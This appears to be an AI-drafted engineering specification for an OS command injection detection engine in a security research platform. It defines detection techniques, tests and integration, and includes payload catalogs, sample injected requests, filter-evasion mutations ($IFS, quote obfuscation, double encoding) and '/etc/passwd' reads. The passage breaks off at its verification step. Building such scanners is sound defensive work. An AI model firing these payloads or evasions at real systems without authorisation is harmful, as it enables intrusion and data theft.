# Sprint 11 Specification: OS Command Injection (CMDi) Detection Engine

## Overview & Architecture Alignment
This document establishes the definitive engineering specification for Sprint 11: OS Command Injection (CMDi) Engine in the ARGUS autonomous security research platform. The design directly aligns with existing ARGUS collector conventions (`SQLInjectionCollector`, `XSSCollector`, `PathTraversalCollector`) to provide seamless integration with `AuthenticatedHttpClient`, `TaskGenerator` DAG, `ToolRegistry`, `PluginExecutorAdapter`, and `AttackSurfaceGraphBuilder`.

---

## Features Discovered

| # | Category | Feature | Description | Inputs | Outputs | Error Behavior | Discovered Via |
|---|----------|---------|-------------|--------|---------|----------------|----------------|
| 1 | Detection | Result-Based CMDi Detection | Executes OS commands whose standard output is reflected in the HTTP response; verifies execution via strict regex signatures. | Target URL, parameter name/type, baseline response | Match metadata (technique="result_based", os_flavor, matched_pattern, snippet, severity="critical", confidence=0.95) | Returns None on non-match or benign reflection | `ORIGINAL_REQUEST.md`, `sql_injection.py`, `path_traversal.py` |
| 2 | Detection | Time-Based Blind CMDi Detection | Injects shell delay commands and calculates latency differential against clean baseline response. | Target URL, baseline latency, delay threshold (default 4.0s) | Match metadata (technique="time_blind", injected_elapsed, baseline_elapsed, delay_delta, severity="critical", confidence=0.95) | Returns None if delta < threshold or timeout occurs | `ORIGINAL_REQUEST.md`, `sql_injection.py` |
| 3 | Detection | Error-Based CMDi Detection | Injects syntax-breaking shell characters triggering OS/shell-level error messages in HTTP response. | Target URL, parameter, HTTP response | Match metadata (technique="error_based", shell_flavor, error_signature, severity="high", confidence=0.90) | Returns None if no shell error pattern matches | `ORIGINAL_REQUEST.md`, `sql_injection.py` |
| 4 | Mutations | Semicolon & Sequential Execution Strategy | Generates sequential command chain payloads (` ; cmd`, `; cmd ;`, `;; cmd`). | Base command string (e.g. `id`) | Mutated payload variants | Preserves valid shell syntax | `ORIGINAL_REQUEST.md` R3 |
| 5 | Mutations | Pipe & Conditional Pipe Strategy | Generates piping payloads (` | cmd`, ` || cmd`, ` | cmd |`). | Base command string | Mutated payload variants | Preserves valid shell syntax | `ORIGINAL_REQUEST.md` R3 |
| 6 | Mutations | Ampersand & Backgrounding Strategy | Generates background/AND payloads (` & cmd`, ` && cmd`, ` & cmd &`). | Base command string | Mutated payload variants | Preserves valid shell syntax | `ORIGINAL_REQUEST.md` R3 |
| 7 | Mutations | Command Substitution Strategy | Generates subshell execution payloads (`` `cmd` ``, `$(cmd)`, `$(echo cmd|sh)`). | Base command string | Mutated payload variants | Preserves valid shell syntax | `ORIGINAL_REQUEST.md` R3 |
| 8 | Mutations | Newline Injection Strategy | Injects raw/encoded newline characters (`\n`, `\r\n`, `%0a`, `%0d%0a`). | Base command string | Mutated payload variants | Preserves valid shell syntax | `ORIGINAL_REQUEST.md` R3 |
| 9 | Mutations | URL & Double URL-Encoding Strategy | Percent-encodes special shell characters (`%3B`, `%7C`, `%26`, `%253B`, `%257C`, etc.). | Base or separator payload | Encoded payload strings | Preserves alphanumeric chars | `ORIGINAL_REQUEST.md` R3, `sql_injection.py` |
| 10 | Mutations | Whitespace Substitution Strategy | Substitutes spaces with `$IFS`, `${IFS}`, `$IFS$9`, `%09` (tab), or `+`. | Command with arguments (e.g. `cat /etc/passwd`) | Space-free payload variants | Falls back to original if no space | `ORIGINAL_REQUEST.md` R3, `sql_injection.py` |
| 11 | Mutations | Inline Quote & Obfuscation Strategy | Inserts single/double quotes or backslashes (`w'h'o'a'm'i`, `w"h"o"a"m"i`, `w\hoami`). | Base command string | Obfuscated command variants | Handles special tokens gracefully | OWASP CMDi Testing Guide |
| 12 | Target Vectors | GET Query Parameter Injection | Injects payloads into all URL query string parameters. | Endpoint URL, parameters dictionary | Mutated HTTP GET request | Gracefully handles empty or unparseable query strings | `sql_injection.py`, `xss.py` |
| 13 | Target Vectors | POST Body Injection (Form & JSON) | Injects payloads into form fields (`application/x-www-form-urlencoded`) and JSON keys (`application/json`). | Endpoint URL, POST body dictionary/JSON | Mutated HTTP POST request | Handles nested JSON, type coercion, and non-dict bodies | `sql_injection.py`, `xss.py` |
| 14 | Target Vectors | Path Segment Injection | Injects payloads into numeric or ID-like path segments (e.g. `/ping/127.0.0.1;id`). | Endpoint URL, path segments | Mutated GET request URL | Preserves scheme, netloc, and non-target segments | `sql_injection.py` |
| 15 | Target Vectors | HTTP Header Injection | Injects payloads into `User-Agent`, `Referer`, `Cookie`, and `X-Forwarded-For`. | Endpoint URL, headers dictionary | Mutated HTTP request with custom headers | Skips malformed header keys | `sql_injection.py`, `xss.py` |
| 16 | Pipeline | TaskGenerator DAG Scheduling | Schedules CMDi task after API endpoint discovery; resolves focus areas & coverage gaps. | Mission state, CoverageGap | ResearchTask with tool_id="command_injection" | Falls back to evidence correlation template | `task_generator.py` |
| 17 | Pipeline | Tool Registry & Internal Plugin Adapter | Registers `command_injection` tool with safety requirements and instantiates collector fallback. | Tool identifier, capabilities | `CommandInjectionCollector` instance | Raises/logs on missing dependency | `registry.py`, `plugins.py` |
| 18 | Pipeline | Attack Surface Graph Integration | Creates `vulnerability:cmdi:...` node and connects `live_host -> HAS_ENDPOINT -> endpoint`, `live_host -> HAS_VULNERABILITY -> vuln`, `endpoint -> HAS_VULNERABILITY -> vuln`. | Discovered Evidence(category="command_injection") | Updated KnowledgeGraph | Idempotent node & edge addition | `attack_surface.py` |
| 19 | Validation | False Positive & Reflection Suppression | Validates that output is actual execution result and not static documentation, reflected search text, or pre-existing baseline text. | Response body, baseline body, payload | Boolean (True if false positive, False if valid) | Safe default True if body empty or invalid | `sql_injection.py`, `xss.py` |

---

## Edge Cases

| # | Feature | Input | Observed / Expected Behavior |
|---|---------|-------|------------------------------|
| 1 | Baseline Comparison | Response already contains `root:x:0:0:` or `uid=` before injection | Rejects finding; baseline subtraction ensures pre-existing strings are ignored. |
| 2 | Pure Echo / Reflection | Response reflects `whoami; id` verbatim in an HTML `<input>` or search heading without command execution output | Rejects finding; requires execution signature match (e.g. `uid=\d+`) and absence in raw input template. |
| 3 | Time-Blind Jitter | Server experiences random 4.5s latency spike on benign request | Control verification request (benign or `sleep 0`) confirms latency is payload-induced, avoiding false positive. |
| 4 | Empty Mission Assets | Mission initialized with `endpoints=[]`, `live_hosts=[]`, `subdomains=[]` | Collector exits cleanly returning `[]`, no uncaught exceptions. |
| 5 | Malformed URLs | Endpoints containing `None`, `""`, `"://invalid-url:99999"`, or integer objects | Filters out invalid URLs gracefully; parses valid URLs without crashing. |
| 6 | Nested JSON Post Bodies | POST payload `{"config": {"host": "127.0.0.1", "settings": {"dns": "8.8.8.8"}}}` | Traverses and injects at leaves without corrupting outer JSON syntax. |
| 7 | Non-ASCII / Binary Response | Response returns gzip, raw image bytes, or UTF-16 characters | Safely decodes text with `errors="replace"` before applying regex matching. |
| 8 | Multi-Parameter Endpoints | URL with 10+ query parameters `?a=1&b=2&c=3...` | Fuzzes each parameter individually while keeping all other parameters constant. |
| 9 | Windows vs POSIX Targets | Target running Windows Server with `cmd.exe` vs Linux container with `dash` | Includes both POSIX (`id`, `uname`, `sleep`) and Windows (`whoami`, `ver`, `timeout /t`) probe suites. |
| 10 | WAF Special Char Filtering | Target WAF blocks `;` and `|` with 403 Forbidden | Evaluates alternative mutation strategies (newlines `%0a`, backticks, `$IFS`, `${IFS}`, URL-encoded variants). |
| 11 | Arithmetic Canary Execution | Parameter allows subshell execution: `$(expr 28412 + 19283)` | Matches exact computed result `47695` in response body while confirming `28412 + 19283` is not present alone. |
| 12 | Rate Limiting / 429 Status | Target returns 429 Too Many Requests | Logs warning, respects backoff, does not falsely identify 429 latency as time-based injection. |
| 13 | Path Segments with Slashes | Mutated path segment contains `%2f` or `/` | Ensures URL structure is preserved and valid URL encoding is maintained. |
| 14 | Header Injection Restrictions | Restricted headers like `Content-Length` or `Host` | Fuzzes safe injectible headers (`User-Agent`, `Referer`, `Cookie`, `X-Forwarded-For`, `X-Client-IP`). |
| 15 | High Latency Network Timeout | Network socket times out during time-based fuzzing | Catches `TimeoutException` or socket timeout gracefully, recording latency accurately without unhandled termination. |

---

## Detailed Technical Specifications

### Section A: Result-Based Detection Engine

#### 1. Exact Command Payload Catalog
```python
RESULT_COMMAND_PAYLOADS: List[Dict[str, Any]] = [
    # POSIX Identity & System Info
    {"cmd": "id", "os": "posix", "canary_type": "regex", "signature": "unix_id"},
    {"cmd": "whoami", "os": "posix", "canary_type": "regex", "signature": "unix_whoami"},
    {"cmd": "uname -a", "os": "posix", "canary_type": "regex", "signature": "unix_uname"},
    {"cmd": "cat /etc/passwd", "os": "posix", "canary_type": "regex", "signature": "unix_passwd"},
    {"cmd": "head -n 1 /etc/passwd", "os": "posix", "canary_type": "regex", "signature": "unix_passwd"},
    
    # POSIX Arithmetic Canary
    {"cmd": "expr 28412 + 19283", "os": "posix", "canary_type": "exact", "expected": "47695"},
    
    # Windows Identity & System Info
    {"cmd": "whoami", "os": "windows", "canary_type": "regex", "signature": "windows_whoami"},
    {"cmd": "ver", "os": "windows", "canary_type": "regex", "signature": "windows_ver"},
    {"cmd": "set", "os": "windows", "canary_type": "regex", "signature": "windows_set"},
    {"cmd": "dir C:\\", "os": "windows", "canary_type": "regex", "signature": "windows_dir"},
    {"cmd": "ipconfig", "os": "windows", "canary_type": "regex", "signature": "windows_ipconfig"},
]
```

#### 2. Regex Signatures Catalog
```python
OS_RESULT_SIGNATURES: Dict[str, re.Pattern] = {
    # POSIX ID output: uid=0(root) gid=0(root) or uid=1000(app)
    "unix_id": re.compile(
        r"(?:uid=\d+\([a-zA-Z0-9_\-.]+\)\s+gid=\d+\([a-zA-Z0-9_\-.]+\)|uid=\d+\s+gid=\d+)",
        re.IGNORECASE,
    ),
    # POSIX passwd file content
    "unix_passwd": re.compile(
        r"root:[x*]:0:0:.*?:(?:/root|/bin/(?:bash|sh|zsh|dash|nologin))",
        re.MULTILINE,
    ),
    # POSIX uname output: Linux hostname 5.15.0-76-generic ...
    "unix_uname": re.compile(
        r"\b(?:Linux|Darwin|FreeBSD|OpenBSD|NetBSD|SunOS)\s+[\w\.\-]+\s+\d+\.\d+[\w\.\-]*",
        re.IGNORECASE,
    ),
    # Windows whoami output: nt authority\system or DOMAIN\user
    "windows_whoami": re.compile(
        r"\b(?:nt authority\\(?:system|network service|local service)|[a-zA-Z0-9_\-\.]+\\[a-zA-Z0-9_\-\.]+)\b",
        re.IGNORECASE,
    ),
    # Windows ver output: Microsoft Windows [Version 10.0.19045.3324]
    "windows_ver": re.compile(
        r"Microsoft\s+Windows\s+\[Version\s+\d+\.\d+[\.\d+]*\]",
        re.IGNORECASE,
    ),
    # Windows set output: COMSPEC=C:\Windows\system32\cmd.exe
    "windows_set": re.compile(
        r"\b(?:COMSPEC=.*cmd\.exe|SystemRoot=C:\\Windows|OS=Windows_NT)\b",
        re.IGNORECASE,
    ),
    # Windows dir output: Volume Serial Number is ...
    "windows_dir": re.compile(
        r"(?:Volume in drive [A-Z] is|Volume Serial Number is [0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}|Directory of [A-Z]:\\)",
        re.IGNORECASE,
    ),
    # Windows ipconfig output: Windows IP Configuration
    "windows_ipconfig": re.compile(
        r"(?:Windows IP Configuration|Ethernet adapter|IPv4 Address[\.\s]+:)",
        re.IGNORECASE,
    ),
}
```

#### 3. False Positive & Reflection Suppression Logic
1. **Baseline Differential**: If signature matches in `baseline_resp.raw_body`, the match is rejected as pre-existing static content.
2. **Payload Reflection Check**: If the injected command text (e.g. `whoami`) is reflected inside `<input value="...">` or `<title>` without the corresponding OS execution signature (e.g. `nt authority\system` or `uid=`), reject finding.
3. **Arithmetic Validation**: For `expr 28412 + 19283`, ensure `47695` is present in the response while not present in the baseline response.

---

### Section B: Time-Based Blind Differential Engine

#### 1. Delay Command Catalog
```python
TIME_DELAY_PAYLOADS_TEMPLATE: List[Dict[str, Any]] = [
    # POSIX sleep
    {"template": "sleep {delay}", "os": "posix"},
    {"template": "sleep {delay}s", "os": "posix"},
    # POSIX ping delay (count = delay + 1 packets)
    {"template": "ping -c {delay} 127.0.0.1", "os": "posix"},
    
    # Windows timeout
    {"template": "timeout /t {delay} /nobreak", "os": "windows"},
    {"template": "timeout /t {delay}", "os": "windows"},
    # Windows ping delay
    {"template": "ping -n {delay} 127.0.0.1", "os": "windows"},
    # Windows PowerShell sleep
    {"template": "powershell -c Start-Sleep -s {delay}", "os": "windows"},
    
    # Cross-Platform / Fallback
    {"template": "sleep {delay} || timeout /t {delay}", "os": "generic"},
]
```

#### 2. Timing Measurement & Threshold Formulation
- **Standard Delay Parameter**: `delay = 5` seconds.
- **Baseline Measurement**: Send benign probe request: `baseline_elapsed = baseline_resp.elapsed`.
- **Injected Request Measurement**: Send delay payload: `injected_elapsed = injected_resp.elapsed`.
- **Differential Calculation**:
  $$\Delta t = \text{injected\_elapsed} - \text{baseline\_elapsed}$$
- **Evaluation Criteria**:
  $$\Delta t \ge 4.0 \text{ seconds} \quad \text{AND} \quad \text{injected\_elapsed} \ge 4.0 \text{ seconds}$$
- **Stability Control**: If $\Delta t \ge 4.0$, execute control request with `delay = 0` (or `sleep 0`) to confirm that baseline timing returns to $< 1.0\text{s}$, verifying that high latency is not caused by general server saturation.

---

### Section C: Error-Based Detection Engine

#### 1. OS & Shell Error Regex Catalog
```python
OS_ERROR_SIGNATURES: Dict[str, List[Tuple[str, re.Pattern]]] = {
    "unix_bash": [
        ("bash_not_found", re.compile(r"/bin/(?:ba)?sh:\s*(?:line \d+:\s*)?[^:\n]+:\s*(?:command )?not found", re.IGNORECASE)),
        ("dash_not_found", re.compile(r"sh:\s*\d*:\s*[^:\n]+:\s*not found", re.IGNORECASE)),
        ("zsh_not_found", re.compile(r"zsh:\s*command not found:\s*[^:\n]+", re.IGNORECASE)),
        ("bash_syntax_error", re.compile(r"syntax error near unexpected token", re.IGNORECASE)),
        ("sh_syntax_error", re.compile(r"/bin/sh:\s*syntax error", re.IGNORECASE)),
        ("generic_syntax_error", re.compile(r"syntax error:\s*unexpected", re.IGNORECASE)),
        ("no_such_file", re.compile(r"/bin/(?:ba)?sh:[^:\n]+:\s*No such file or directory", re.IGNORECASE)),
    ],
    "windows_cmd": [
        ("cmd_not_recognized", re.compile(r"'[^']+' is not recognized as an internal or external command,\s*operable program or batch file", re.IGNORECASE)),
        ("cmd_syntax_incorrect", re.compile(r"The syntax of the command is incorrect\.", re.IGNORECASE)),
        ("cmd_path_not_found", re.compile(r"The system cannot find the (?:path|file) specified\.", re.IGNORECASE)),
        ("cmd_volume_incorrect", re.compile(r"The filename, directory name, or volume label syntax is incorrect\.", re.IGNORECASE)),
    ],
    "windows_powershell": [
        ("ps_cmdlet_not_found", re.compile(r"The term '[^']+' is not recognized as the name of a cmdlet", re.IGNORECASE)),
        ("ps_command_not_found_exc", re.compile(r"CommandNotFoundException", re.IGNORECASE)),
        ("ps_parser_error", re.compile(r"ParseException|MissingExpressionAfterOperator", re.IGNORECASE)),
        ("ps_position_msg", re.compile(r"At line:\d+\s+char:\d+", re.IGNORECASE)),
    ],
}
```

#### 2. Malformed Trigger Payloads
```python
DEFAULT_ERROR_TRIGGER_PAYLOADS: List[str] = [
    "; argus_nonexistent_cmd_xyz ;",
    "| argus_nonexistent_cmd_xyz",
    "& argus_nonexistent_cmd_xyz &",
    "`argus_nonexistent_cmd_xyz`",
    "$(argus_nonexistent_cmd_xyz)",
    ";;;",
    "|||",
    "&&&",
    "| '",
    '; "',
]
```

---

### Section D: Separator & Bypass Mutation Strategies (8 Distinct Strategies)

| Strategy # | Name | Description & Transformation | Example Output (for `id`) |
|---|---|---|---|
| 1 | Semicolon Chaining | Sequential execution using semicolons | `; id`, `; id ;`, `;; id` |
| 2 | Pipe Chaining | Pipe and conditional OR execution | `\| id`, `\|\| id`, `\| id \|` |
| 3 | Ampersand Chaining | Background and conditional AND execution | `& id`, `&& id`, `& id &` |
| 4 | Command Substitution | Subshell evaluation via backticks and dollar-parens | `` `id` ``, `$(id)`, `$(echo id\|sh)` |
| 5 | Newline Separators | Line-break command separators (raw and URL-encoded) | `\nid`, `%0aid`, `%0d%0aid` |
| 6 | URL / Double URL Encoding | Percent-encoding separator characters to bypass basic input filters | `%3B id`, `%7C id`, `%26 id`, `%253B id`, `%257C id` |
| 7 | Whitespace Substitutions | Replacing spaces using `$IFS`, `${IFS}`, `$IFS$9`, tab (`%09`), or `+` | `cat${IFS}/etc/passwd`, `cat$IFS$9/etc/passwd`, `cat%09/etc/passwd` |
| 8 | Inline Quote Obfuscation | Character quoting and backslash insertion to evade keyword string filters | `w'h'o'a'm'i`, `w"h"o"a"m"i`, `w\hoami` |

#### Concrete Python Generator Method Specifications:
```python
class CommandInjectionPayloadGenerator:
    def mutate_semicolons(self, cmd: str) -> List[str]:
        return [f"; {cmd}", f"; {cmd} ;", f" ; {cmd}", f";; {cmd}"]

    def mutate_pipes(self, cmd: str) -> List[str]:
        return [f"| {cmd}", f"|| {cmd}", f" | {cmd} |", f" || {cmd} ||"]

    def mutate_ampersands(self, cmd: str) -> List[str]:
        return [f"& {cmd}", f"&& {cmd}", f" & {cmd} &", f" && {cmd} &&"]

    def mutate_substitution(self, cmd: str) -> List[str]:
        return [f"`{cmd}`", f"$({cmd})", f"`echo {cmd} | sh`", f"$(echo {cmd} | sh)"]

    def mutate_newlines(self, cmd: str) -> List[str]:
        return [f"\n{cmd}", f"\r\n{cmd}", f"%0a{cmd}", f"%0d%0a{cmd}"]

    def mutate_url_encoding(self, payload: str) -> List[str]:
        single_enc = urllib.parse.quote(payload, safe="")
        double_enc = urllib.parse.quote(single_enc, safe="")
        return [single_enc, double_enc]

    def mutate_whitespace(self, cmd: str) -> List[str]:
        if " " not in cmd:
            return [cmd]
        return [
            cmd.replace(" ", "${IFS}"),
            cmd.replace(" ", "$IFS$9"),
            cmd.replace(" ", "%09"),
            cmd.replace(" ", "+"),
        ]

    def mutate_inline_quotes(self, cmd: str) -> List[str]:
        parts = cmd.split(" ", 1)
        base = parts[0]
        rest = (" " + parts[1]) if len(parts) > 1 else ""
        single_q = "".join(f"'{c}'" if c.isalpha() else c for c in base) + rest
        double_q = "".join(f'"{c}"' if c.isalpha() else c for c in base) + rest
        backslash = "".join(f"\\{c}" if c.isalpha() and i % 2 == 1 else c for i, c in enumerate(base)) + rest
        return [single_q, double_q, backslash]

    def generate_all_mutations(self, base_cmd: str) -> List[str]:
        variants = []
        for fn in [
            self.mutate_semicolons,
            self.mutate_pipes,
            self.mutate_ampersands,
            self.mutate_substitution,
            self.mutate_newlines,
        ]:
            variants.extend(fn(base_cmd))
        # Apply whitespace, quotes, and url encodings to generated variants
        ...
```

---

### Section E: Parameter Injection Target Vectors

```
+-----------------------------------------------------------------------------------+
|                        HTTP REQUEST INJECTION POINTS                              |
+-----------------------------------------------------------------------------------+
| 1. Query String Params  : /api/ping?ip=127.0.0.1;id&format=json                   |
| 2. POST Form Body       : ip=127.0.0.1%0aid&submit=Run                            |
| 3. POST JSON Body       : {"host": "127.0.0.1; whoami", "timeout": 5}            |
| 4. Path Segments        : /tools/traceroute/127.0.0.1%7Cid                        |
| 5. HTTP Headers         : User-Agent: Mozilla/5.0; $(whoami)                      |
|                           Referer: https://example.com/; id                       |
|                           Cookie: session_id=abc; id                              |
|                           X-Forwarded-For: 127.0.0.1; id                          |
+-----------------------------------------------------------------------------------+
```

#### Standard Probe Routes and Common Vulnerable Parameter Names:
```python
DEFAULT_CMDI_PROBE_ROUTES: List[str] = [
    "/ping", "/api/ping",
    "/traceroute", "/api/traceroute",
    "/nslookup", "/api/dns",
    "/system/exec", "/api/system",
    "/admin/tools", "/api/tools",
    "/view_log", "/api/logs",
    "/download", "/export",
    "/backup", "/api/backup",
]

COMMON_CMDI_PARAMS: Set[str] = {
    "ip", "host", "hostname", "domain", "target", "addr", "address",
    "cmd", "command", "exec", "run", "daemon", "query", "arg", "args",
    "file", "filename", "filepath", "path", "dir", "log", "output",
    "tool", "ping", "traceroute", "lookup", "url", "uri", "fetch",
}
```

---

### Section F: Pipeline & Architecture Integration Contracts

#### 1. Core Classes in `argus/collectors/command_injection.py`:
- `CommandInjectionCollector(BaseCollector)`: Main collector class implementing `collect(mission) -> List[Evidence]`.
- `CommandInjectionPayloadGenerator`: Handles base payload generation and 8 mutation strategies.
- `CommandInjectionAnalyzer`: Performs result-based regex matching, time-based differential evaluation, error-based regex matching, and false positive suppression.

#### 2. Evidence Model Structure:
```python
Evidence(
    category="command_injection",
    title=f"OS Command Injection: {param} on {target_url}",
    description=f"OS Command Injection ({technique}) confirmed on endpoint {target_url} via {param_type} parameter '{param}' using payload '{payload}'. Evidence snippet: {snippet}",
    severity="critical" if technique in ("result_based", "time_blind") else "high",
    confidence=0.95 if technique == "result_based" else (0.95 if technique == "time_blind" else 0.90),
    value=target_url,
    provenance=ProvenanceData(
        source="authenticated_http_client",
        method=http_method,
        step_id="command_injection_collector",
    ),
    tags=["command_injection", "cmdi", "rce", technique, param_type, template_id],
    metadata={
        "category": "command_injection",
        "url": target_url,
        "host": base_url,
        "parameter": param,
        "param_type": param_type,
        "payload": payload,
        "technique": technique,
        "template_id": template_id,
        "status_code": status_code,
        "snippet": snippet,
        "severity": severity,
    }
)
```

#### 3. TaskGenerator DAG Wiring (`argus/planning/task_generator.py`):
- Add `"command_injection"` to `_RECON_TEMPLATES`:
  - `title`: `"Fuzz OS Command Injection (CMDi)"`
  - `goal`: `"Actively fuzz discovered endpoint parameters and HTTP headers for OS command injection vulnerabilities using AuthenticatedHttpClient."`
  - `category`: `TaskCategory.EVIDENCE_CORRELATION`
  - `required_inputs`: `["endpoints"]`
  - `expected_outputs`: `["vulnerabilities", "observations", "evidence"]`
  - `dependencies`: `["Discover API Endpoints"]`
  - `metadata`: `{"tool_id": "command_injection"}`
  - `priority`: `0.82`
- Map focus areas and coverage gaps:
  - `if area_lower in ("command injection", "cmdi", "command_injection", "os command injection", "shell injection", "rce", "remote code execution"): return _RECON_TEMPLATES["command_injection"]`
  - In `TaskCategory.EVIDENCE_CORRELATION`: check `"command"`, `"cmdi"`, `"shell"`, `"rce"` in `gap_desc_lower`.

#### 4. Tool Registry (`argus/runtime/registry.py`) & Plugin Adapter (`argus/runtime/plugins.py`):
- `registry.register(Tool(id="command_injection", name="Command Injection Collector", capability="command_injection_detector", ...))`
- Add alias `"cmdi": "command_injection"`, `"command_injection": "command_injection"`
- In `PluginExecutorAdapter.instantiate_fallback()`: handle `"command_injection" in plugin_id or "cmdi" in plugin_id` returning `CommandInjectionCollector()`.

#### 5. Attack Surface Graph Integration (`argus/graph/attack_surface.py`):
- Section 13 in `build()`: Process `ev.category in ("command_injection", "cmdi", "os_command_injection")`.
- Create `Node(id=f"vulnerability:{template_id}:{target_url}:{param_name}", type="vulnerability", value=vuln_name, metadata=vuln_meta)`.
- Connect:
  - `graph.connect(lh_node.id, ep_id, edge_type="HAS_ENDPOINT")`
  - `graph.connect(lh_node.id, vuln_id, edge_type="HAS_VULNERABILITY")`
  - `graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")`

---

## Acceptance Criteria Mapping & Test Matrix (Tiers 1-4)

### Tier 1: Unit Tests (Payloads, Analyzers, Mutations, Signatures)
1. **`test_cmdi_payload_generator_base_suites`**: Verifies generation of error payloads, result payloads, and time payloads.
2. **`test_cmdi_mutations_semicolons`**: Asserts `;`, `;;`, and sequential chaining variants are produced.
3. **`test_cmdi_mutations_pipes_and_ampersands`**: Asserts `|`, `||`, `&`, `&&` variants are generated correctly.
4. **`test_cmdi_mutations_command_substitution`**: Asserts `` `cmd` `` and `$(cmd)` subshell formats.
5. **`test_cmdi_mutations_newlines`**: Asserts `\n`, `\r\n`, `%0a`, `%0d%0a` injection formats.
6. **`test_cmdi_mutations_url_and_double_encoding`**: Asserts single and double percent-encoded variants.
7. **`test_cmdi_mutations_whitespace_substitution`**: Asserts `$IFS`, `${IFS}`, `$IFS$9`, `%09`, `+` replacements.
8. **`test_cmdi_mutations_inline_quotes`**: Asserts `w'h'o'a'm'i` and `w\hoami` keyword obfuscations.
9. **`test_cmdi_analyzer_posix_result_signatures`**: Asserts regex matching on `uid=0(root) gid=0(root)`, `Linux ...`, `root:x:0:0:`.
10. **`test_cmdi_analyzer_windows_result_signatures`**: Asserts regex matching on `nt authority\system`, `Microsoft Windows [Version 10...]`.
11. **`test_cmdi_analyzer_error_signatures`**: Asserts matching of Bash (`command not found`, `syntax error near unexpected token`) and Windows CMD (`not recognized as an internal or external command`).
12. **`test_cmdi_analyzer_time_blind_threshold`**: Asserts match when delta $\ge 4.0\text{s}$ and rejection when delta $< 4.0\text{s}$.
13. **`test_cmdi_analyzer_false_positive_rejection`**: Asserts suppression of pre-existing baseline text, empty responses, and benign word reflections.

### Tier 2: Component Collector Tests (Injection Vectors & Mock HTTP Execution)
14. **`test_cmdi_collector_query_param_result_based`**: Injects `id` into `?ip=127.0.0.1;id`, verifies Evidence emission (critical severity).
15. **`test_cmdi_collector_post_form_body_result_based`**: Injects `whoami` into URL-encoded POST body, verifies Evidence emission.
16. **`test_cmdi_collector_post_json_body_result_based`**: Injects `cat /etc/passwd` into JSON payload, verifies Evidence emission.
17. **`test_cmdi_collector_path_segment_result_based`**: Injects payload into `/tools/ping/127.0.0.1;id`, verifies Evidence emission.
18. **`test_cmdi_collector_http_header_injection`**: Injects payload into `User-Agent` and `Referer` headers, verifies Evidence emission.
19. **`test_cmdi_collector_time_based_blind`**: Simulates 5.0s response on `sleep 5`, verifies Time-Blind Evidence emission.
20. **`test_cmdi_collector_error_based`**: Simulates `/bin/sh: command not found` on malformed command, verifies High severity Evidence.
21. **`test_cmdi_collector_mutation_bypass_success`**: Endpoint blocks raw `;` with 403 but allows `%0a` newline or `$IFS`, collector discovers vulnerability.

### Tier 3: Integration Tests (Pipeline, DAG, Registry, Graph)
22. **`test_cmdi_task_generator_dag_wiring`**: Verifies TaskGenerator maps CMDi focus areas and coverage gaps into scheduled research tasks with dependency on endpoint discovery.
23. **`test_cmdi_tool_registry_and_plugin_adapter`**: Verifies tool registry resolution and `PluginExecutorAdapter` instantiating `CommandInjectionCollector`.
24. **`test_cmdi_attack_surface_graph_integration`**: Asserts Evidence creates `vulnerability:cmdi:...` node and `HAS_ENDPOINT` & `HAS_VULNERABILITY` edges.

### Tier 4: Mission Loop & Adversarial Edge Case Tests
25. **`test_cmdi_adversarial_malformed_urls_and_empty_mission`**: Fuzzes empty missions, None endpoints, and malformed URLs without exceptions.
26. **`test_cmdi_adversarial_network_exceptions`**: Simulates connection resets, timeouts, and 500 errors during collector run.
27. **`test_cmdi_adversarial_reflection_without_execution`**: Server reflects exact payload string inside search page without executing; verifies zero false positives.
28. **`test_cmdi_e2e_mission_integration`**: Runs ControlledMission end-to-end verifying CMDi collector runs and populates `mission.vulnerabilities`.

---

## 5-Component Handoff Report

### 1. Observation
- Inspected `/home/varun/argus/.agents/ORIGINAL_REQUEST.md` (Sprint 11 section ## 2026-08-30T11:08:07Z, lines 135–178):
  - R1 requires CMDi collector fuzzing query parameters, POST body fields, path segments, and HTTP headers using `AuthenticatedHttpClient`.
  - R2 requires 3 multi-technique detection methods: Result-based, Time-based blind (threshold $\ge 4.0\text{s}$), and Error-based.
  - R3 requires at least 5 separator/bypass mutation strategies (semicolons, pipes, ampersands, backticks, dollar-parens, newlines `%0a`, URL-encoded variants).
  - R4 requires TaskGenerator DAG wiring, tool registry registration, and AttackSurfaceGraph `HAS_VULNERABILITY` edges.
  - R5 requires zero regression on 996+ passing tests, at least 20 new tests, and handoff to `.agents/sprint11_cmdi/handoff.md`.
- Analyzed existing collectors `argus/collectors/sql_injection.py`, `argus/collectors/xss.py`, and `argus/collectors/path_traversal.py`. Verified three-class architecture (`*Collector`, `*PayloadGenerator`, `*Analyzer`), Evidence data structures, and edge creation patterns.
- Validated regex signatures in Python for POSIX (`id`, `passwd`, `uname`), Windows (`whoami`, `ver`, `dir`, `set`), and Shell errors (Bash, Dash, Zsh, CMD, PowerShell).

### 2. Logic Chain
1. *Collector Architecture Consistency*: Since `SQLInjectionCollector` and `XSSCollector` utilize modular `PayloadGenerator` and `Analyzer` classes that cleanly decouple mutation generation and response inspection from network transport, implementing `CommandInjectionCollector`, `CommandInjectionPayloadGenerator`, and `CommandInjectionAnalyzer` ensures seamless consistency across the ARGUS engine.
2. *Multi-Technique Rigor*: Result-based detection provides definitive proof (confidence 0.95, critical severity) when OS execution signatures match. Time-based blind differential analysis provides robust detection against blind/asynchronous sinks by comparing latency against a measured baseline ($\Delta t \ge 4.0\text{s}$). Error-based detection catches verbose server misconfigurations where command execution was attempted but failed syntax checks (confidence 0.90, high severity).
3. *WAF & Filter Bypass*: Real-world applications and WAFs frequently strip or filter simple semicolons. Implementing 8 distinct mutation strategies (semicolons, pipes, ampersands, command substitutions, newlines, URL/double-URL encoding, whitespace replacements via `$IFS`, and inline quote obfuscation) ensures high audit coverage and filter evasion capabilities.
4. *Pipeline Integrity*: Registering the tool in `registry.py`, configuring fallback resolution in `plugins.py`, wiring DAG task resolution in `task_generator.py`, and generating `HAS_VULNERABILITY` graph edges in `attack_surface.py` guarantees automated orchestration during full mission execution.

### 3. Caveats
- Out-of-Band (OAST/DNS) detection is not part of this sprint scope (requires external collaborator listener); testing focuses on Result-Based, Time-Based Blind, and Error-Based techniques.
- Time-based detection threshold is fixed at $\ge 4.0\text{s}$ above baseline; extremely high latency networks or heavily throttled endpoints should use control verification requests to prevent false positives.

### 4. Conclusion
The specification for Sprint 11 OS Command Injection (CMDi) Detection Engine is complete, authoritative, and fully detailed. All payload sets, regex patterns, timing formulas, mutation strategies, injection vectors, pipeline contracts, and test cases (Tiers 1-4, 28 tests) are defined and ready for the implementation worker.

### 5. Verification Method
1. Verify specification file existence:
